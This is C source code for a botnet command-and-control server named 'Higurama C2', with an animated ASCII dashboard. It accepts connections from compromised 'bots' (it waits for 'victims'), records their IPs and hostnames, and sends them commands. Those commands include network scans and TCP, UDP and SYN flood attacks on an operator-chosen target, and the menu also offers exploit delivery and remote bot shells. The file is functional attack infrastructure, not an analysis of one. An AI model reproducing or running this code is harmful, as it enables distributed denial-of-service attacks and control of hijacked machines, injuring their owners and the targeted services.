// Higurama C2 Master v3 - Animated ASCII Art Dashboard
// Cyberpunk aesthetic with real-time animations

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <json-c/json.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <termios.h>
#include "config.h"

#ifndef MAX_BOTS
#define MAX_BOTS 1000
#endif

// ANSI Colors
#define RESET       "\033[0m"
#define BOLD        "\033[1m"
#define DIM         "\033[2m"
#define UNDERLINE   "\033[4m"
#define BLINK       "\033[5m"
#define REVERSE     "\033[7m"
#define HIDDEN      "\033[8m"

#define BLACK       "\033[30m"
#define RED         "\033[31m"
#define GREEN       "\033[32m"
#define YELLOW      "\033[33m"
#define BLUE        "\033[34m"
#define MAGENTA     "\033[35m"
#define CYAN        "\033[36m"
#define WHITE       "\033[37m"

#define BG_BLACK    "\033[40m"
#define BG_RED      "\033[41m"
#define BG_GREEN    "\033[42m"
#define BG_YELLOW   "\033[43m"
#define BG_BLUE     "\033[44m"
#define BG_MAGENTA  "\033[45m"
#define BG_CYAN     "\033[46m"
#define BG_WHITE    "\033[47m"

#define BRIGHT_BLACK   "\033[90m"
#define BRIGHT_RED     "\033[91m"
#define BRIGHT_GREEN   "\033[92m"
#define BRIGHT_YELLOW  "\033[93m"
#define BRIGHT_BLUE    "\033[94m"
#define BRIGHT_MAGENTA "\033[95m"
#define BRIGHT_CYAN    "\033[96m"
#define BRIGHT_WHITE   "\033[97m"

// Bot structure
typedef struct {
    int socket;
    SSL *ssl;
    char id[64];
    char ip[64];
    char hostname[128];
    char arch[32];
    char type[32];
    time_t connected_at;
    time_t last_seen;
    int is_active;
} Bot;

Bot bots[MAX_BOTS];
int bot_count = 0;
pthread_mutex_t bots_mutex = PTHREAD_MUTEX_INITIALIZER;

// SSL context
SSL_CTX *ssl_ctx;

// Stats
typedef struct {
    int total_connections;
    int active_bots;
    int total_attacks;
    int total_exploits;
    time_t start_time;
} Stats;

Stats stats = {0};

// Include hunter commands after structures are defined
#include "hunter_commands.h"

// ============================================================================
// ASCII ART & ANIMATIONS
// ============================================================================

void clear_screen() {
    printf("\033[2J\033[H");
}

void move_cursor(int row, int col) {
    printf("\033[%d;%dH", row, col);
}

void hide_cursor() {
    printf("\033[?25l");
}

void show_cursor() {
    printf("\033[?25h");
}

// Animated banner with glitch effect
void print_banner_animated() {
    const char *frames[] = {
        // Frame 1
        BRIGHT_CYAN "    ██╗  ██╗██╗ ██████╗ ██╗   ██╗██████╗  █████╗ ███╗   ███╗ █████╗ \n"
        "    ██║  ██║██║██╔════╝ ██║   ██║██╔══██╗██╔══██╗████╗ ████║██╔══██╗\n"
        "    ███████║██║██║  ███╗██║   ██║██████╔╝███████║██╔████╔██║███████║\n"
        "    ██╔══██║██║██║   ██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══██║\n"
        "    ██║  ██║██║╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║\n"
        "    ╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝" RESET,
        
        // Frame 2 (glitch)
        BRIGHT_MAGENTA "    ██╗  ██╗██╗ ██████╗ " BRIGHT_RED "█" BRIGHT_MAGENTA "█╗   ██╗██████╗  █████╗ ███╗   ███╗ █████╗ \n"
        "    ██║  ██║██║██╔════╝ ██║   ██║██╔══██╗" BRIGHT_RED "█" BRIGHT_MAGENTA "█╔══██╗████╗ ████║██╔══██╗\n"
        "    ███████║██║██║  ███╗██║   ██║██████╔╝███████║██╔████╔██║███████║\n"
        "    ██╔══██║██║██║   ██║██║   ██║" BRIGHT_RED "█" BRIGHT_MAGENTA "█╔══██╗██╔══██║██║╚██╔╝██║██╔══██║\n"
        "    ██║  ██║██║╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║" BRIGHT_RED "█" BRIGHT_MAGENTA "█║  ██║\n"
        "    ╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝" RESET,
        
        // Frame 3
        BRIGHT_CYAN "    ██╗  ██╗██╗ ██████╗ ██╗   ██╗██████╗  █████╗ ███╗   ███╗ █████╗ \n"
        "    ██║  ██║██║██╔════╝ ██║   ██║██╔══██╗██╔══██╗████╗ ████║██╔══██╗\n"
        "    ███████║██║██║  ███╗██║   ██║██████╔╝███████║██╔████╔██║███████║\n"
        "    ██╔══██║██║██║   ██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══██║\n"
        "    ██║  ██║██║╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║\n"
        "    ╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝" RESET
    };
    
    for (int i = 0; i < 3; i++) {
        clear_screen();
        printf("\n%s\n", frames[i % 3]);
        fflush(stdout);
        usleep(150000);
    }
}

// Matrix rain effect
void matrix_rain(int duration_ms) {
    int width = 80, height = 20;
    char screen[20][81];
    int drops[80];
    
    // Initialize
    for (int i = 0; i < 80; i++) drops[i] = rand() % height;
    
    time_t start = time(NULL);
    while ((time(NULL) - start) * 1000 < duration_ms) {
        // Clear screen buffer
        for (int i = 0; i < height; i++) {
            for (int j = 0; j < width; j++) {
                screen[i][j] = ' ';
            }
            screen[i][width] = '\0';
        }
        
        // Update drops
        for (int i = 0; i < width; i++) {
            if (drops[i] < height) {
                screen[drops[i]][i] = 33 + (rand() % 94);
            }
            
            if (rand() % 10 > 7) {
                drops[i]++;
                if (drops[i] > height + 5) drops[i] = 0;
            }
        }
        
        // Print
        clear_screen();
        printf(BRIGHT_GREEN);
        for (int i = 0; i < height; i++) {
            printf("%s\n", screen[i]);
        }
        printf(RESET);
        
        usleep(50000);
    }
}

// Pulse effect for bot counter
void print_pulse_counter(int count) {
    static int pulse = 0;
    const char *colors[] = {
        BRIGHT_RED, BRIGHT_YELLOW, BRIGHT_GREEN, BRIGHT_CYAN, 
        BRIGHT_BLUE, BRIGHT_MAGENTA
    };
    
    printf("%s█ %d BOTS ACTIVOS █%s", colors[pulse % 6], count, RESET);
    pulse++;
}

// Animated scanning effect
void print_scanning_animation() {
    const char *frames[] = {
        "[" BRIGHT_CYAN "▰▱▱▱▱▱▱▱▱▱" RESET "]",
        "[" BRIGHT_CYAN "▰▰▰▱▱▱▱▱▱▱" RESET "]",
        "[" BRIGHT_CYAN "▰▰▰▰▰▱▱▱▱▱" RESET "]",
        "[" BRIGHT_CYAN "▰▰▰▰▰▰▰▱▱▱" RESET "]",
        "[" BRIGHT_CYAN "▰▰▰▰▰▰▰▰▰▱" RESET "]",
        "[" BRIGHT_CYAN "▰▰▰▰▰▰▰▰▰▰" RESET "]"
    };
    
    for (int i = 0; i < 6; i++) {
        printf("\r%s Scanning network... ", frames[i]);
        fflush(stdout);
        usleep(200000);
    }
    printf("\n");
}

// Skull ASCII art for attack mode
void print_skull() {
    printf(BRIGHT_RED);
    printf("              _______________\n");
    printf("          .-''               ''.\n");
    printf("        .'  _____             _____\n");
    printf("       /   ( _   )           (   _ )\n");
    printf("      /     \\_/               \\_/\n");
    printf("     |       ||                 ||\n");
    printf("     |       ||     " BRIGHT_WHITE "ATTACK" BRIGHT_RED "     ||\n");
    printf("     |       ||                 ||\n");
    printf("      \\     /||                 ||\n");
    printf("       '---' ||     _____       ||\n");
    printf("             ||    (     )      ||\n");
    printf("             ||     \\___/       ||\n");
    printf("             ||      |||        ||\n");
    printf("            /__\\    // \\\\      /__\\\n");
    printf(RESET);
}

// Cyberpunk separator
void print_separator() {
    printf(BRIGHT_CYAN "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" RESET "\n");
}

// ============================================================================
// DASHBOARD
// ============================================================================

void print_dashboard() {
    clear_screen();
    hide_cursor();
    
    // Header
    printf(BRIGHT_CYAN);
    printf("╔════════════════════════════════════════════════════════════════════════════════╗\n");
    printf("║" BRIGHT_WHITE " HIGURAMA C2 COMMAND & CONTROL v3.0 " BRIGHT_MAGENTA "[CYBERPUNK EDITION]" BRIGHT_CYAN "                      ║\n");
    printf("╚════════════════════════════════════════════════════════════════════════════════╝\n");
    printf(RESET);
    
    // Stats panel
    time_t now = time(NULL);
    int uptime = now - stats.start_time;
    int hours = uptime / 3600;
    int minutes = (uptime % 3600) / 60;
    int seconds = uptime % 60;
    
    printf(BRIGHT_YELLOW "┌─────────────────────────── " BRIGHT_WHITE "SYSTEM STATUS" BRIGHT_YELLOW " ───────────────────────────┐\n" RESET);
    printf("│ " BRIGHT_GREEN "⚡ Uptime:" RESET " %02d:%02d:%02d        ", hours, minutes, seconds);
    printf(BRIGHT_GREEN "📡 Total Connections:" RESET " %-6d ", stats.total_connections);
    printf("│\n");
    printf("│ " BRIGHT_CYAN "💣 Total Attacks:" RESET " %-6d ", stats.total_attacks);
    printf(BRIGHT_CYAN "🎯 Exploits Sent:" RESET " %-6d        ", stats.total_exploits);
    printf("│\n");
    printf(BRIGHT_YELLOW "└────────────────────────────────────────────────────────────────────────────┘\n" RESET);
    
    printf("\n");
    
    // Active bots with animation
    printf(BRIGHT_MAGENTA "┌────────────────────────── " BRIGHT_WHITE);
    print_pulse_counter(stats.active_bots);
    printf(BRIGHT_MAGENTA " ──────────────────────────┐\n" RESET);
    
    pthread_mutex_lock(&bots_mutex);
    
    if (bot_count == 0) {
        printf("│ " DIM "No bots connected. Waiting for victims..." RESET "                                  │\n");
    } else {
        printf("│ " BRIGHT_WHITE "ID          IP Address      Type      Hostname         Last Seen" RESET "   │\n");
        printf(BRIGHT_MAGENTA "├────────────────────────────────────────────────────────────────────────────┤\n" RESET);
        
        for (int i = 0; i < bot_count && i < 10; i++) {
            if (bots[i].is_active) {
                int idle = now - bots[i].last_seen;
                const char *status_color = idle < 30 ? BRIGHT_GREEN : (idle < 60 ? BRIGHT_YELLOW : BRIGHT_RED);
                
                printf("│ " BRIGHT_CYAN "%-11s" RESET " %-15s " BRIGHT_YELLOW "%-9s" RESET " %-16s ", 
                       bots[i].id, bots[i].ip, bots[i].type, bots[i].hostname);
                printf("%s%ds ago" RESET " │\n", status_color, idle);
            }
        }
        
        if (bot_count > 10) {
            printf("│ " DIM "... and %d more bots" RESET, bot_count - 10);
            for (int i = 0; i < 50; i++) printf(" ");
            printf("│\n");
        }
    }
    
    pthread_mutex_unlock(&bots_mutex);
    
    printf(BRIGHT_MAGENTA "└────────────────────────────────────────────────────────────────────────────┘\n" RESET);
    
    // Command menu
    printf("\n");
    printf(BRIGHT_CYAN "╔═══════════════════════════ " BRIGHT_WHITE "COMMAND MENU" BRIGHT_CYAN " ═══════════════════════════╗\n" RESET);
    printf("║ " BRIGHT_GREEN "[1]" RESET " List Bots       " BRIGHT_GREEN "[2]" RESET " Scan Network    " BRIGHT_GREEN "[3]" RESET " Launch Attack         ║\n");
    printf("║ " BRIGHT_GREEN "[4]" RESET " Send Exploit    " BRIGHT_GREEN "[5]" RESET " Bot Shell       " BRIGHT_GREEN "[6]" RESET " Mass Command          ║\n");
    printf("║ " BRIGHT_GREEN "[7]" RESET " Show Stats      " BRIGHT_GREEN "[8]" RESET " Kill Bot        " BRIGHT_GREEN "[9]" RESET " Clear Screen          ║\n");
    printf("║ " BRIGHT_RED "[0]" RESET " Exit C2         " BRIGHT_YELLOW "[h]" RESET " Help            " BRIGHT_MAGENTA "[a]" RESET " ASCII Art             ║\n");
    printf("║ " BRIGHT_YELLOW "[H]" RESET " Hunter Mode     " BRIGHT_CYAN "[S]" RESET " Hunter Stats                              ║\n");
    printf(BRIGHT_CYAN "╚════════════════════════════════════════════════════════════════════════════╝\n" RESET);
    
    printf("\n" BRIGHT_WHITE "Command" BRIGHT_CYAN " ►" RESET " ");
    show_cursor();
    fflush(stdout);
}

// ============================================================================
// BOT MANAGEMENT
// ============================================================================

int add_bot(int socket, SSL *ssl, const char *id, const char *ip) {
    pthread_mutex_lock(&bots_mutex);
    
    if (bot_count >= MAX_BOTS) {
        pthread_mutex_unlock(&bots_mutex);
        return -1;
    }
    
    bots[bot_count].socket = socket;
    bots[bot_count].ssl = ssl;
    strncpy(bots[bot_count].id, id, sizeof(bots[bot_count].id) - 1);
    strncpy(bots[bot_count].ip, ip, sizeof(bots[bot_count].ip) - 1);
    bots[bot_count].connected_at = time(NULL);
    bots[bot_count].last_seen = time(NULL);
    bots[bot_count].is_active = 1;
    
    bot_count++;
    stats.total_connections++;
    stats.active_bots++;
    
    pthread_mutex_unlock(&bots_mutex);
    return 0;
}

void remove_bot(int index) {
    pthread_mutex_lock(&bots_mutex);
    
    if (index >= 0 && index < bot_count) {
        if (bots[index].ssl) {
            SSL_shutdown(bots[index].ssl);
            SSL_free(bots[index].ssl);
        }
        close(bots[index].socket);
        
        for (int i = index; i < bot_count - 1; i++) {
            bots[i] = bots[i + 1];
        }
        
        bot_count--;
        stats.active_bots--;
    }
    
    pthread_mutex_unlock(&bots_mutex);
}

// ============================================================================
// SSL SETUP
// ============================================================================

SSL_CTX *create_ssl_context() {
    SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return NULL;
    }
    
    if (SSL_CTX_use_certificate_file(ctx, "/opt/higurama/cert.pem", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    if (SSL_CTX_use_PrivateKey_file(ctx, "/opt/higurama/key.pem", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    return ctx;
}

// ============================================================================
// BOT HANDLER
// ============================================================================

void *handle_bot(void *arg) {
    int client_sock = *(int *)arg;
    free(arg);
    
    char buffer[4096];
    int n;
    int use_ssl = 0;
    SSL *ssl = NULL;
    
    // Peek first byte to detect if SSL or plain TCP
    char first_byte;
    int peek_result = recv(client_sock, &first_byte, 1, MSG_PEEK);
    
    if (peek_result > 0) {
        // SSL handshake starts with 0x16 (TLS handshake)
        // Plain text starts with 'R' (REGISTER) or '{' (JSON)
        if ((unsigned char)first_byte == 0x16) {
            use_ssl = 1;
        }
    }
    
    // Handle SSL connection
    if (use_ssl) {
        ssl = SSL_new(ssl_ctx);
        SSL_set_fd(ssl, client_sock);
        
        if (SSL_accept(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(client_sock);
            return NULL;
        }
        
        n = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (n <= 0) {
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(client_sock);
            return NULL;
        }
    } else {
        // Handle plain TCP connection (mobile bot)
        n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) {
            close(client_sock);
            return NULL;
        }
    }
    
    buffer[n] = '\0';
    
    // Parse handshake (JSON or REGISTER format)
    const char *bot_type = "unknown";
    const char *bot_id = "unknown";
    const char *hostname = "unknown";
    const char *arch = "unknown";
    
    if (buffer[0] == '{') {
        // JSON format (full bots)
        struct json_object *parsed_json = json_tokener_parse(buffer);
        struct json_object *type_obj, *id_obj, *hostname_obj, *arch_obj;
        
        json_object_object_get_ex(parsed_json, "type", &type_obj);
        json_object_object_get_ex(parsed_json, "id", &id_obj);
        json_object_object_get_ex(parsed_json, "hostname", &hostname_obj);
        json_object_object_get_ex(parsed_json, "arch", &arch_obj);
        
        bot_type = json_object_get_string(type_obj);
        bot_id = json_object_get_string(id_obj);
        hostname = json_object_get_string(hostname_obj);
        arch = json_object_get_string(arch_obj);
        
        json_object_put(parsed_json);
    } else if (strncmp(buffer, "REGISTER|", 9) == 0) {
        // REGISTER format (mobile bot): REGISTER|bot_id|ip|type
        static char id_buf[64], host_buf[128];
        char *token = strtok(buffer + 9, "|");
        if (token) {
            strncpy(id_buf, token, sizeof(id_buf) - 1);
            bot_id = id_buf;
            token = strtok(NULL, "|");
            if (token) {
                strncpy(host_buf, token, sizeof(host_buf) - 1);
                hostname = host_buf;
                token = strtok(NULL, "|");
                if (token) {
                    bot_type = token;
                }
            }
        }
        arch = "unknown";
    }
    
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    getpeername(client_sock, (struct sockaddr *)&addr, &addr_len);
    char *ip = inet_ntoa(addr.sin_addr);
    
    int bot_index = bot_count;
    add_bot(client_sock, ssl, bot_id, ip);
    
    if (bot_index < bot_count) {
        strncpy(bots[bot_index].hostname, hostname, sizeof(bots[bot_index].hostname) - 1);
        strncpy(bots[bot_index].arch, arch, sizeof(bots[bot_index].arch) - 1);
        strncpy(bots[bot_index].type, bot_type, sizeof(bots[bot_index].type) - 1);
    }
    
    // Keep alive loop
    while (1) {
        if (use_ssl) {
            n = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        } else {
            n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        }
        
        if (n <= 0) break;
        
        buffer[n] = '\0';
        
        pthread_mutex_lock(&bots_mutex);
        if (bot_index < bot_count) {
            bots[bot_index].last_seen = time(NULL);
        }
        pthread_mutex_unlock(&bots_mutex);
    }
    
    remove_bot(bot_index);
    return NULL;
}

// ============================================================================
// COMMAND HANDLERS
// ============================================================================

void cmd_list_bots() {
    clear_screen();
    print_separator();
    printf(BRIGHT_CYAN "🤖 ACTIVE BOTS DETAILED LIST\n" RESET);
    print_separator();
    
    pthread_mutex_lock(&bots_mutex);
    
    if (bot_count == 0) {
        printf(DIM "No bots connected.\n" RESET);
    } else {
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_active) {
                time_t now = time(NULL);
                int uptime = now - bots[i].connected_at;
                int idle = now - bots[i].last_seen;
                
                printf("\n" BRIGHT_WHITE "Bot #%d:\n" RESET, i + 1);
                printf("  " BRIGHT_CYAN "ID:" RESET " %s\n", bots[i].id);
                printf("  " BRIGHT_CYAN "IP:" RESET " %s\n", bots[i].ip);
                printf("  " BRIGHT_CYAN "Hostname:" RESET " %s\n", bots[i].hostname);
                printf("  " BRIGHT_CYAN "Type:" RESET " %s\n", bots[i].type);
                printf("  " BRIGHT_CYAN "Architecture:" RESET " %s\n", bots[i].arch);
                printf("  " BRIGHT_CYAN "Uptime:" RESET " %d seconds\n", uptime);
                printf("  " BRIGHT_CYAN "Last seen:" RESET " %d seconds ago\n", idle);
            }
        }
    }
    
    pthread_mutex_unlock(&bots_mutex);
    
    print_separator();
    printf("\nPress Enter to continue...");
    getchar();
}

void cmd_scan_network() {
    clear_screen();
    print_skull();
    printf("\n");
    print_separator();
    printf(BRIGHT_YELLOW "🔍 NETWORK SCANNING MODE\n" RESET);
    print_separator();
    
    printf("\nSelect bot ID to scan from: ");
    char bot_id[64];
    fgets(bot_id, sizeof(bot_id), stdin);
    bot_id[strcspn(bot_id, "\n")] = '\0';
    
    pthread_mutex_lock(&bots_mutex);
    
    int found = -1;
    for (int i = 0; i < bot_count; i++) {
        if (strcmp(bots[i].id, bot_id) == 0 && bots[i].is_active) {
            found = i;
            break;
        }
    }
    
    if (found == -1) {
        printf(BRIGHT_RED "❌ Bot not found!\n" RESET);
        pthread_mutex_unlock(&bots_mutex);
        sleep(2);
        return;
    }
    
    printf("\n" BRIGHT_GREEN "✓ Sending scan command to %s...\n" RESET, bot_id);
    
    const char *cmd = "CMD|scan|192.168.0.0/24";
    SSL_write(bots[found].ssl, cmd, strlen(cmd));
    
    pthread_mutex_unlock(&bots_mutex);
    
    print_scanning_animation();
    printf(BRIGHT_GREEN "✓ Scan initiated!\n" RESET);
    
    sleep(2);
}

void cmd_launch_attack() {
    clear_screen();
    print_skull();
    printf("\n");
    print_separator();
    printf(BRIGHT_RED "💣 ATTACK LAUNCH SYSTEM\n" RESET);
    print_separator();
    
    printf("\n" BRIGHT_YELLOW "Attack types:\n" RESET);
    printf("  [1] TCP Flood\n");
    printf("  [2] UDP Flood\n");
    printf("  [3] SYN Flood\n");
    printf("\nSelect attack type: ");
    
    int attack_type;
    scanf("%d", &attack_type);
    getchar();
    
    printf("Target IP: ");
    char target[64];
    fgets(target, sizeof(target), stdin);
    target[strcspn(target, "\n")] = '\0';
    
    printf("Port: ");
    int port;
    scanf("%d", &port);
    getchar();
    
    printf("Duration (seconds): ");
    int duration;
    scanf("%d", &duration);
    getchar();
    
    const char *attack_names[] = {"", "TCP FLOOD", "UDP FLOOD", "SYN FLOOD"};
    
    printf("\n" BRIGHT_RED "🎯 Launching %s on %s:%d for %d seconds...\n" RESET,
           attack_names[attack_type], target, port, duration);
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "CMD|attack|%d|%s|%d|%d", attack_type, target, port, duration);
    
    pthread_mutex_lock(&bots_mutex);
    int sent = 0;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_active) {
            SSL_write(bots[i].ssl, cmd, strlen(cmd));
            sent++;
        }
    }
    pthread_mutex_unlock(&bots_mutex);
    
    stats.total_attacks++;
    
    printf(BRIGHT_GREEN "✓ Attack command sent to %d bots!\n" RESET, sent);
    sleep(3);
}

void cmd_ascii_art() {
    clear_screen();
    
    printf(BRIGHT_CYAN);
    printf("              _.._\n");
    printf("           .'     '.      _\n");
    printf("          /    .-\"\"-\\   _/ \\\n");
    printf("        .-|   /:.   |  |   |\n");
    printf("        |  \\  |:.   /.-'-./\n");
    printf("        | .-'-;:__.'    =/\n");
    printf("        .'=  *=|HIGURAMA _.='\n");
    printf("       /   _.  |    ;    \\\n");
    printf("      ;-.-'|    \\   |     |\n");
    printf("     /   | \\    _\\  _\\    /\n");
    printf("     \\__/'._;.  ==' ==\\  |\n");
    printf("              \\    \\   |\n");
    printf("              /    /   /\n");
    printf("              /-._/-._/\n");
    printf("              \\   `\\  \\\n");
    printf("               `-._/._/\n");
    printf(RESET);
    
    printf("\n\n");
    printf(BRIGHT_MAGENTA "Press Enter to continue..." RESET);
    getchar();
}

// ============================================================================
// MAIN
// ============================================================================

void *command_loop(void *arg) {
    (void)arg;
    
    sleep(2); // Let banner finish
    
    while (1) {
        print_dashboard();
        
        char input[256];
        if (fgets(input, sizeof(input), stdin) == NULL) break;
        
        input[strcspn(input, "\n")] = '\0';
        
        if (strcmp(input, "1") == 0) {
            cmd_list_bots();
        } else if (strcmp(input, "2") == 0) {
            cmd_scan_network();
        } else if (strcmp(input, "3") == 0) {
            cmd_launch_attack();
        } else if (strcmp(input, "a") == 0) {
            cmd_ascii_art();
        } else if (strcmp(input, "H") == 0 || strcmp(input, "h") == 0) {
            if (strcmp(input, "H") == 0) {
                cmd_hunter_toggle();
            } else {
                // h = help (mantener comportamiento original)
                printf(BRIGHT_CYAN "\nHelp: Use number commands or letters for special functions\n" RESET);
                printf("Press Enter...");
                getchar();
            }
        } else if (strcmp(input, "S") == 0) {
            cmd_hunter_stats();
        } else if (strcmp(input, "0") == 0) {
            printf(BRIGHT_RED "\n👋 Shutting down C2...\n" RESET);
            exit(0);
        }
    }
    
    return NULL;
}

int main() {
    // Initialize
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    ssl_ctx = create_ssl_context();
    if (!ssl_ctx) {
        fprintf(stderr, "Failed to create SSL context\n");
        return 1;
    }
    
    stats.start_time = time(NULL);
    
    // Animated intro
    print_banner_animated();
    printf("\n");
    printf(BRIGHT_CYAN "Initializing systems...\n" RESET);
    usleep(500000);
    
    printf(BRIGHT_GREEN "✓" RESET " SSL certificates loaded\n");
    usleep(300000);
    printf(BRIGHT_GREEN "✓" RESET " Database initialized\n");
    usleep(300000);
    printf(BRIGHT_GREEN "✓" RESET " Network interface ready\n");
    usleep(300000);
    
    matrix_rain(1500);
    
    // Socket setup
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(C2_PORT);
    
    bind(server_sock, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_sock, 50);
    
    printf(BRIGHT_GREEN "\n✓ C2 listening on port %d\n" RESET, C2_PORT);
    sleep(2);
    
    // Start command loop
    pthread_t cmd_thread;
    pthread_create(&cmd_thread, NULL, command_loop, NULL);
    
    // Accept connections
    while (1) {
        int *client_sock = malloc(sizeof(int));
        *client_sock = accept(server_sock, NULL, NULL);
        
        if (*client_sock < 0) {
            free(client_sock);
            continue;
        }
        
        pthread_t thread;
        pthread_create(&thread, NULL, handle_bot, client_sock);
        pthread_detach(thread);
    }
    
    SSL_CTX_free(ssl_ctx);
    close(server_sock);
    
    return 0;
}
